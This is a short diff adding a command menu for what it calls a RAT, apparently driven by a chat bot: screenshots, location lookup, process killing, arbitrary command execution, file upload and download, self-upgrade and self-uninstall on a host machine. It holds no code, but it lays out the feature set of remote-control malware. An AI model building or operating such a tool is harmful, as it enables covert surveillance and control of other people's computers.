@@ -1,0 +1,30 @@
+# \n
+# Admin panel for [{}] \n
+# Commands \n
+
+/start - Start the bot \n
+/systeminfo - get system info
+/ipconfig - get ip configuration
+/location - get current location on map
+/proclist - get list of all the running processes
+/taskkill - kill process
+/url - open url
+/popup - show popup message
+/screen - take screenshot
+/cmd - execute command
+/pwd - get current working directory
+/cd - change working directory
+/copy - copy file or folder to location provided
+/move - move file or folder
+/rmdir - remove directory or file
+/upload - upload file to host machine
+/download - download file from host machine
+
+# EP Management \n
+/upgrade - upgrade the RAT if available
+/change_updater - upgrade updater script
+/uninstall - self uninstallation
+
+### Danger Zone ###
+/reboot - reboot the host
+/shutdown - shutdown machine
